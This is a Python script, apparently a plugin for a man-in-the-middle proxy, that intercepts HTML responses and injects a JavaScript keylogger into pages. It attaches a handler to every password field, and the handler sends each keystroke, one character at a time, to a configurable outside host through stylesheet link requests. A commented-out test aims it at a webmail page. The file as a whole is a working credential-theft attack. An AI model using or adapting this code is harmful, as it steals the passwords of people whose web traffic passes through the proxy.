#!/usr/bin/python
import urllib2
from BeautifulSoup import BeautifulSoup
import support.header as header

### CHANGE AS NEEDED
match = (("Content-type","TEXT/HTML"),)
keylog_dest = 'http://chicago.inguardians.com'


### CHANGE AT YOUR OWN RISK!!!
keyloggerfunc = '''<script>function k(e) {var k;var f;if(window.event) k = window.event.keyCode;else if(e) k = e.which;f = document.createElement("link");f.setAttribute("rel", "stylesheet");f.setAttribute("type", "text/css");f.setAttribute("href", "''' + keylog_dest + '''/" + String.fromCharCode(k));document.body.appendChild(f);return true;}</script>'''



### FUNCTION TO MANIPULATE CLIENT REQUEST
def doRequest(session, request_header, data):
  return(request_header, data, 0, 0)



### FUNCTION TO MANIPULATE SERVER RESPONSE
def doResponse(session, request_header, response_header, data):
  changed = 0
  stop = 0

  ### DETERMINE IF WE NEED TO CHANGE DATA
  if header.headertest(response_header):

    ### MANIPULATE DATA - INSERT FUNCTION, FIND PASSWORD FIELDS, AND ADD HANDLER
    soup = BeautifulSoup(data)
    soup.head.insert(-1, keyloggerfunc)
    for i in soup.body.findAll('input', type="password"):
      #ToDo - check for existing onKeyDown attributes
      i['onKeyPress'] = "return k(event);"
      changed = 1
    data = str(soup)
    print("Password field(s) being logged to " + keylog_dest)

  ### RETURN DATA
  header.headerfix(response_header, "Content-Length", str(len(data)) + '\r\n')
  return(response_header, data, changed, stop)



#### UNIT TEST - TO DELETE UPON INTEGRATION
#url = 'http://mail.google.com/mail'
#response = urllib2.urlopen(url)
#data = response.read()
#h = str(response.info()).splitlines(1)
#response_header = [ ( "Request",response.geturl() ) ]
#for x in h:
 #response_header.append( tuple( x.split( ": ", 1 ) ) )

#(response_header, data, changed, stop) = doResponse(0, 0, response_header, data)
#print data

